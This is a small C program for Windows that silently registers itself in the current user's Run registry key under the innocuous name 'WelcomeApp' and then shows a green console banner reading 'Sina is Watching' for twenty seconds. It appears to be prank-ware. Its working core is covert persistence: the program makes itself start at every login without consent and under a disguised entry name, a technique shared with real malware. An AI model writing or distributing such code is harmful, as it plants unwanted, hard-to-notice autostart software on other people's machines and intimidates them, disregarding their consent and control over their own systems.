#include <stdio.h>
#include <windows.h>

void add_to_startup() {
    HKEY hKey;
    char path[MAX_PATH];
    
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegOpenKeyEx(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    
    RegSetValueEx(hKey, "WelcomeApp", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
}

int main() {
    add_to_startup();
    
    SetConsoleTitle("Sina is Watching");
    system("color 0A");
    
    printf("\n\n");
    printf("   _____ _               _      __          __   _       _     _             \n");
    printf("  / ____(_)             (_)     \\ \\        / /  | |     | |   (_)            \n");
    printf(" | (___  _ _ __   __ _   _ ___   \\ \\  /\\  / /_ _| |_ ___| |__  _ _ __   __ _ \n");
    printf("  \\___ \\| | '_ \\ / _` | | / __ \\ \\/  \\/ / _` | __/ __| '_ \\| | '_ \\ / _` |\n");
    printf("  ____) | | | | | (_| || \\__ \\    \\  /\\  / (_| | || (__| | | | | | | | (_| |\n");
    printf(" |_____/|_|_| |_|\\__,_| |_|___/     \\/  \\/ \\__,_|\\__\\___|_| |_|_|_| |_|\\__, |\n");
    printf("                                                                        __/ |\n");
    printf("                                                                       |___/ \n");
    printf("\n\n");
    
    Sleep(20000);
    
    return 0;
}